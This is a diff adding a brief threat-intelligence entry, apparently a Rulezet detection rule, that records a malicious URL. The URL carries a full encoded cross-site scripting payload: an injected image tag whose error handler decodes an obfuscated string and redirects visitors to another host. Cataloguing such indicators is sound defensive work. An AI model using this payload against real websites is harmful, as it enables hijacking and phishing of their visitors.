@@ -1,0 +1,5 @@
+# AT related malicious URL (de.colomboag.ch/index.php?site=%22%2F%3E%3Cimg%20src%3D%22https%3A%2F%2Fgoogle.com%2FtB75rXsgzm59O.jpg%22%20onerror%3D%22window.location%3DdecodeURIComponent%28atob%28%27Njg3NDc0NzA3MzNhMmYyZjY1NzI3NDc2NzA2MTc2NjQ3YTZmNmU2NDJlMzAzMjMxMzEzMTMwNjYzNjJkMzUzMTM0MzYyZDM0NjE2NDM3MmQ2MTYyNjYzMDJkNjIzOTMxNjE2NDY2Mzg2NDM1NjY2NjMzMmU2MzZjNjk2MzZiMmY2MTYyMzczNTMzMzgzMTMzMmQzNjM1NjIzODJkMzQzOTM3MzAyZDM5Mzk2NDM0MmQ2MjMyNjIzMjYxNjI2MzMyMzEzMjY1MzYyZTcwNjg3MA%3D%3D%27%29.replace%28%2F%28..%29%2Fg%2C%20%27%25%241%27%29%29%3B%22%3E)
+
+[View this rule on Rulezet](https://rulezet.org/rule/detail_rule/751629)
+
+Rulezet UUID: `d0690f34-fd93-492e-bf2e-52217b93476e`
